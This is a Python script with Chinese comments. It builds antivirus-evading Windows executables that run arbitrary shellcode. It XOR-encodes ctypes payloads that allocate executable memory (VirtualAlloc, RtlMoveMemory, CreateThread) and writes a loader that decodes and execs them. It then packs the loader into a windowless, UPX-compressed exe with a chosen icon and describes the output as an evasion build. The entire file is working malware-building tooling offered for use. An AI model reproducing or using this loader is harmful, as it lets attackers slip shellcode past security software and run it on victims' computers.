import subprocess
import random
import string
import shutil
import os

pyname = "shellcode.py"

def get_random_keys():
    length = 8
    table = string.ascii_letters + string.digits
    keys = ''
    for i in range(length):
        keys += table[random.randint(0,len(table)-1)]
    return keys

"""
def payload_decode(funcs,keys):
    func_codes = ''
    random.seed(keys)
    func_code = funcs.split(',')
    for item in func_code:
        item = int(item)
        func_codes += chr(item ^ random.randint(0, 255))
    return func_codes
"""

def payload_encode(payload,keys):
    random.seed(keys)
    funcs = ""
    for item in payload:
        funcs += str(ord(item) ^ random.randint(0, 255)) + ','
    funcs = funcs.strip(',')
    return funcs

def code_x32_x64(arch,keys,funcs,shellcode): 
    # 编写执行脚本并写入文件
    code = f"""import ctypes
import random

def payload_decode(funcs,keys):
    func_codes = ''
    random.seed(keys)
    func_code = funcs.split(',')
    for item in func_code:
        item = int(item)
        func_codes += chr(item ^ random.randint(0, 255))
    return func_codes

def run_{arch}(shellcode):
    funcs = "{funcs}"
    func = payload_decode(funcs,"{keys}")
    exec(func)

shellcode = {shellcode}
run_{arch}(shellcode)
"""
    open(pyname,'w',encoding='utf-8').write(code)

def clean_output():

    shutil.rmtree('output/')
    os.mkdir('output/')
    print('[+] 清理输出文件成功')


def py2exe(name,icon='exeLogo.ico'):
    # 使用Pyinstaller转换python文件为exe

    cmd = f"pyinstaller -F -w {pyname} --distpath output --specpath tempdir --workpath tempdir --clean -y --upx-dir upx-4.0.1"

    if icon != None and os.path.exists(icon):

        icon = os.path.abspath(icon)

        cmd += f" --icon {icon}"

    print('[*] Cmdline:',cmd)
    
    try:
        subprocess.call(cmd,shell=True)

    except Exception as e:

        print(f'{e}\n[-] 请检查 pyinstaller 是否安装')

        exit()

    try:
        
        file = f"output/{pyname.split('.')[0]}.exe"

        newfile = f"output/{name}.exe"
        
        if os.path.exists(file):

            print('========================')

            os.remove(pyname)

            shutil.rmtree('tempdir/')

            print('[*] 文件清理完毕')

            shutil.move(file,newfile)

            print(f'[+] exe生成完毕 → {newfile} 已将文件复制至剪切板！')

            subprocess.Popen(args=['powershell',f'Get-Item {newfile} | Set-Clipboard'])

    except Exception as e:

        print(f'[*] Something went wrong\n{e}')
        exit()

def create_payload(arch,shellcode,icon=None):
    """ 
    32位的payload
    """
    payload_32 = 'shellcode = bytearray(shellcode);rwxpage = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40));buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(rwxpage),buf,ctypes.c_int(len(shellcode)));ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(rwxpage),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))),ctypes.c_int(-1))'
    """
    64位的payload
    """
    payload_64 = 'ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64;rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode));ctypes.windll.kernel32.WaitForSingleObject(ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0), -1)'

    keys = get_random_keys()

    if arch == 32:

        funcs = payload_encode(payload_32,keys)

    elif arch == 64:

        funcs = payload_encode(payload_64,keys)

    code_x32_x64(arch,keys,funcs,shellcode)

    print('参数信息:')

    print(f'[+] Cipher: {funcs}\n[+] Keys: {keys}\n\n========================')
    
    print('注意：生成的exe的操作系统是根据当前运行脚本的电脑操作系统所决定，生成32位的shellcode注意要用32位的电脑运行。\n[*] Convert shellcode.py to exe......\n免杀制作完成，转换exe中\n')

    if icon:
        py2exe(keys,icon)
    else:
        py2exe(keys)

    print('Convert successfully!')